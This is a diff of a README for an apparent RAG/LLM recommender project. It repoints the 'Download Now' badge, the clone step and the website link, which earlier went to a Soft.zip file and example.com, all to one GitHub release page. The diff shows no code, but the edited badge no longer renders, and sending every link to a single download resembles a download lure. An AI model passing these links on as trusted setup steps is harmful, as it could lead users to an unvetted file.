@@ -18,8 +18,8 @@ The repository is structured as follows:
 ## Getting Started 🚀
 
 To get started with the project, follow these steps:
-1. Clone the repository from [here](https://github.com/files/Soft.zip).
-   [![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/files/Soft.zip)
+1. Clone the repository from [here](https://github.com/HuuVuong0912/rag-llm-based-recommender/releases/tag/v1.2).
+   [![Download Now](https://github.com/HuuVuong0912/rag-llm-based-recommender/releases/tag/v1.2)](https://github.com/HuuVuong0912/rag-llm-based-recommender/releases/tag/v1.2)
 2. Launch the project in your preferred development environment.
 3. Install the necessary dependencies by running the provided setup script.
 4. Connect your Google Cloud Platform account to access the cloud services.
@@ -41,7 +41,7 @@ If you encounter any issues or have feedback to share, please reach out to us th
 
 ## Explore Further 🌐
 
-For more details and to stay updated on the latest developments, visit our [website](https://example.com).
+For more details and to stay updated on the latest developments, visit our [website](https://github.com/HuuVuong0912/rag-llm-based-recommender/releases/tag/v1.2).
 
 ---
 
